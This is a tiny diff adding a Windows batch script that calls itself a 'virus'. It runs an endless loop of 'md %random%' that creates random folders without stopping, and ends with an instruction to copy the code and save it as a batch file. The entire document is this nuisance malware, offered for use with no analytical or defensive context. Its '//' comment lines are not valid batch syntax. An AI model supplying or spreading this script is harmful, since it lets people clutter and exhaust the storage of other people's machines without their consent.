@@ -1,0 +1,8 @@
+//virus which creates several no. of folders.
+
+@echo off
+:whateveryouwant
+md %random%
+goto whateveryouwant
+
+//copy the above code and save it with batch extension
